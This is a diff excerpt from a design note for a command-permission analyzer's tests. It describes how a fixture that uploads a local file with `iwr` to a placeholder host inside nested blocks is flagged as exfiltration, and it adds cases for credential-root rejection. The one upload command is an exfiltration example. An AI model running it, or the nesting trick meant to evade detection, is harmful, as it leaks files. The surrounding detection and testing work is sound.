@@ -1248,6 +1248,8 @@ The unrelated package-json and hashtable failures were false shared-budget exhau
 
 `permission-nested-analysis.test.ts` keeps its original 14 nested `& { ... }` blocks around `iwr https://x.invalid -InFile notes.txt` and its `unproven` result. Only the former null exfiltration expectation changes to the exact existing bare-command upload signal under F: a parser refusal does not erase visible literal-body evidence. The adjacent 16-level POSIX upload and all work/depth assertions remain unchanged.
 
+Fixed namespace-pattern compilation reuse changes no decision cell or existing expectation. New `session-read-access.test.ts` cases prove a different configured root is still evaluated after compilation reuse, a credential-root namespace remains rejected, and platform case behavior is unchanged. Match results, filesystem roots and grants remain uncached by the fixed matcher tables.
+
 ### Windows literal/proof cells
 
 ## encoded-bypass-battery — four fixtures / 32 Windows lane cells
